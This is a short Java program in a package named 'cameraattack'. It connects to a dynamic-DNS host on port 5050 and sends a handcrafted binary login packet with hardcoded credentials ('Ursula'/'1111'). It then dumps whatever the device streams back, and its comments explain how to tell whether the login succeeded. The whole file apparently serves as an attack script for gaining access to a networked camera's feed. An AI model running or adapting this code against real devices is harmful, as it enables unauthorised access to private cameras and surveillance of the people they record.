package com.srg.cameraattack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.net.Socket;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Hello world!
 *
 */
public class App {

    public static void main(String[] args) {
        try {
            Socket socket = new Socket("simonsez180.no-ip.biz", 5050);
            PrintWriter out = new PrintWriter(
                    new OutputStreamWriter(
                            socket.getOutputStream()));
            //       String username = "Ursula"; //hex = 557273756c61
            //      String password = "1111"; //hex = 31313131

            char[] packetData = {0x00, 0x18, 0x64, 0x00, 0x55, 0x72, 0x73, 0x75, 0x6c, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x31, 0x31, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            out.println(packetData);
            out.flush();

            System.out.println("Packet sent...");

            BufferedReader in = new BufferedReader(
                    new InputStreamReader(
                            socket.getInputStream()));

            String line;
            System.out.println("[*] Reading...");
            while ((line = in.readLine()) != null) { //because it just spews out data we won't see a null, so if we stay in the loop we're getting data.

                System.out.println(line);

                //if the response bytes are (decimal notiation): 1,24,1,0,51 then the creds weren't correct and the loop will terminate
            }

        } catch (IOException ex) {
            Logger.getLogger(App.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
